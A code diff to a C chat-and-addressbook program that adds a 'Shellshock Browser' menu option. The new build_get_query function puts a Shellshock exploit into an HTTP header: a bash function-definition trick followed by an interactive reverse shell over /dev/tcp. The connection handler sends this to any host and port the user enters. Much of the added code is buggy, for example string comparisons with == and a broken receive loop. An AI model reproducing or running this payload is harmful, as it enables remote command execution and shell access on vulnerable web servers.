@@ -38,11 +38,13 @@ bool Done = false;
 char *SendBuffer;
 int BytesReceived;
 char *Buffer;
- 
+
+void *connection_handler(void *socket_desc);
 void *connection_handler1(void *socket_desc);
 void *connection_handler2(void *socket_desc);
-int create_tcp_socket();
 char *get_ip(char *host);
+char *build_get_query(char *host, char *page);
+int create_tcp_socket();
 int books(void);
 int books2(void);
 
@@ -137,6 +139,8 @@ const char *inet_ntop(int af, const void *src, char *dst, socklen_t size)
 }
 #endif
 
+#define USERAGENT "Mozilla/5.0 (iPad; CPU OS 10_1_3 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B100 Safari/602."
+
 #ifdef __WIN32__
 #define HOME "C:\\Users\\"
 #else
@@ -173,9 +177,25 @@ char *cora;
 struct sockaddr_in *remote;
 int tmpres;
 char *ip;
+char *get;
+char buf[BUFSIZ+1];
 char *host;
+char *page;
 char *port;
+char *service;
 pthread_t sniffer_thread;
+
+int thread0(void){
+	new_sock = (int*)malloc(1);
+	*new_sock = create_tcp_socket();
+	
+	if(pthread_create(&sniffer_thread,NULL,connection_handler,(void*) *new_sock) < 0){
+		perror("could not create thread");
+		return 1;
+	}
+	
+	pthread_join(sniffer_thread,NULL);
+}
 
 int thread1(void){	
 		new_sock = (int*)malloc(1);
@@ -202,10 +222,9 @@ int thread2(void){
 int main(int argc, char **argv)
 {
 	Start:
-		
-	
+
  	iam();
-	printf("\t\t\tWhat you want to do:\n\t\t\t\t1.) Server\n\t\t\t\t2.) Client\n\t\t\t\t3.) Addressbook Entry\n\t\t\t\t4.) Print Addressbook\n\t\t\t\t5.) Exit\t");
+	printf("\n\t\t\tWhat you want to do:\n\t\t\t1.) ChatServer\t\t6.) Shellshock Browser\n\t\t\t2.) ChatClient\n\t\t\t3.) Addressbook Entry\n\t\t\t4.) Print Addressbook\n\t\t\t5.) Exit\t\t");
     scanf("%c",&action);
     
 	switch(action){
@@ -240,6 +259,26 @@ int main(int argc, char **argv)
     	printf("\n");
     	iam();
       return 0;
+        break;
+    case '6':
+	printf("HOST: \x1B[32m");
+	getchar();
+	host = getline2();
+	printf("\x1b[0m");
+	printf("PAGE: \x1B[32m");
+	getchar();
+	page = getline2();    	
+	printf("\x1b[0m");
+	printf("PORT: \x1B[32m");
+	getchar();
+	port = getline2();
+	printf("\x1b[0m");
+	printf("SERVICE: \x1B[32m");
+	getchar();
+	service = getline2();
+	printf("\x1b[0m");
+	  thread0();
+	  goto Start;
         break;
 	default:
 		goto Start;
@@ -312,6 +351,192 @@ int books2(void) {
     	}
 
 		fclose(fp);
+}
+
+void *connection_handler(void *socket_desc){
+	if(service == "https"){
+		SSL_load_error_strings();
+		OpenSSL_add_ssl_algorithms();
+		meth = TLSv1_client_method();
+		ctx = SSL_CTX_new((void*)meth);
+		CHK_NULL(ctx);
+		
+		if(!ctx){
+			printf("There's NO Crypto Method choosen\n");
+			exit(2);
+		}
+		
+		if(SSL_CTX_load_verify_locations(ctx,CERTF,HOME) <= 0){
+			printf("Verify of the Cert FAILED!\n");
+			exit(3);
+		}
+		
+		if(SSL_CTX_use_certificate_file(ctx,CERTF,SSL_FILETYPE_PEM) <= 0){
+			printf("PEM Cert File is NOT Valid\n");
+			exit(4);
+		}
+		
+		if(SSL_CTX_use_PrivateKey_file(ctx,KEYF,SSL_FILETYPE_PEM) <= 0){
+			printf("PEM CertKey File is NOT Valid\n");
+			exit(5);
+		}
+		
+		if(SSL_CTX_check_private_key(ctx)){
+			printf("Private does not match the public key!\n");
+			exit(6);
+		}
+	}
+	
+  sock2 = *(int*)new_sock;
+  ip = get_ip(host);
+  fprintf(stderr, "IP is %s\n", ip);
+  remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
+  remote->sin_family = AF_INET;
+  tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
+  if( tmpres < 0)  
+  {
+    perror("Can't set remote->sin_addr.s_addr");
+    exit(1);
+  }else if(tmpres == 0)
+  {
+    fprintf(stderr, "%s is not a valid IP address\n", ip);
+    exit(1);
+  }
+  remote->sin_port = htons(atoi(port));
+ 
+  if(connect(sock2, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0){
+    perror("Could not connect");
+    exit(0);
+  }
+  
+  if(service == "https"){
+  	ssl = SSL_new(ctx);
+  	CHK_NULL(ssl);
+  	SSL_set_fd(ssl,sock2);
+  	err = SSL_connect(ssl);
+  	CHK_SSL(err);
+  	printf("SSL Connection using %s \n",SSL_get_cipher(ssl));
+  	server_cert = SSL_get_peer_certificate(ssl);
+  	CHK_NULL(server_cert);
+  	str = X509_NAME_oneline(X509_get_subject_name(server_cert),0,0);
+  	CHK_NULL(str);
+  	printf("\t subject: %s\n",str);
+  	OPENSSL_free(str);
+  	X509_free(server_cert);
+  }
+  
+  get = build_get_query(host, page);
+  fprintf(stderr, "Query is:\n<<START>>\n%s<<END>>\n", get);
+ 
+  //Send the query to the server
+  int sent = 0;
+  if(service == "https"){
+  while(sent < strlen(get)){
+  	tmpres = SSL_write(ssl,get+sent,strlen(get)-sent);
+  	if(tmpres == -1){
+  		perror("can not send query");
+  		exit(1);
+	  }
+  	}
+  }
+  
+  if(service == "http"){
+  while(sent < strlen(get))
+  {
+    tmpres = send(sock2, get+sent, strlen(get)-sent, 0);
+    if(tmpres == -1){
+      	perror("Can't send query");
+      	exit(1);
+    	}
+    	sent += tmpres;
+  	}
+  }
+  
+  //now it is time to receive the page
+  memset(buf, 0, sizeof(buf));
+  int htmlstart = 0;
+  char * htmlcontent;
+    struct timeval timeout;      
+    timeout.tv_sec = 120;
+    timeout.tv_usec = 0;
+
+    if (setsockopt (sock2, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
+        perror("setsockopt failed\n");}
+
+    if (setsockopt (sock2, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
+        perror("setsockopt failed\n");}
+
+	if(service == "https"){
+		while((tmpres = SSL_read(ssl,buf,BUFSIZ)) > 0){
+			if(htmlstart == 0){
+				htmlcontent = strstr(buf,"\r\n\r\n");
+				htmlstart = 1;
+				htmlcontent += 4;
+			}else{
+				htmlcontent = buf;
+			}
+			
+			if(htmlstart){
+				fprintf(stdout,htmlcontent);
+			}
+			
+			memset(buf,0,tmpres);
+			
+			if(tmpres < 0){
+				perror("Error reciving data");
+			}
+		}
+	}
+	
+	if(service == "http"){
+		while((tmpres = recv(sock2,buf,BUFSIZ,0)) < 0){
+			if(htmlstart == 0){
+				htmlcontent = strstr(buf,"\r\n");
+				
+				if(htmlcontent != NULL){
+					htmlstart = 1;
+					htmlcontent += 4;
+				}else{
+					htmlcontent = buf;
+				}
+				
+				if(htmlstart){
+					fprintf(stdout,htmlcontent);
+				}
+				
+				memset(buf,0,tmpres);
+				
+			}
+			
+			if(tmpres < 0){
+				perror("error reciving data");
+			}
+		}
+	}
+	
+	if(service == "https"){
+		SSL_shutdown(ssl);
+#ifdef __WIN32__
+		closesocket(sock2);
+		WSACleanup();
+#else
+		close(sock2);
+#endif
+		SSL_free(ssl);
+		SSL_CTX_free(ctx);
+	}
+	
+	if(service == "http"){
+#ifdef __WIN32__
+		closesocket(sock2);
+		WSACleanup();
+#else
+		close(sock2);
+#endif	
+	}
+  	iam();
+  
+  return 0;
 }
 
 void *connection_handler1(void *socket_desc){  
@@ -496,13 +721,6 @@ void *connection_handler2(void *socket_desc){
 
 	
   sock2 = *(int*)new_sock;
-    //printf("\nPORT: ");
-	//getchar();
-	//scanf("%d",&port);
-	//printf("\nHOST: ");
-	//getchar();
-	//scanf("%c",&host);
-	
   ip = get_ip(host);
   fprintf(stderr, "IP is %s\n", ip);
   remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
@@ -617,4 +835,23 @@ char *get_ip(char *host)
     exit(1);
   }
   return ip;
+}
+
+char *build_get_query(char *host, char *page)
+{
+  char *query;
+  char *getpage = page;
+  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/127.0.0.1/8080 0>&1 : Connection: close:\r\n\r\n";
+  
+  if(getpage[0] == '/'){
+    getpage = getpage + 1;
+  
+  }
+  // -5 is to consider the %s %s %s in tpl and the ending \0
+  
+  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(USERAGENT)+strlen(tpl)-5);
+  
+  sprintf(query, tpl, getpage, host, USERAGENT);
+  
+  return query;
 }
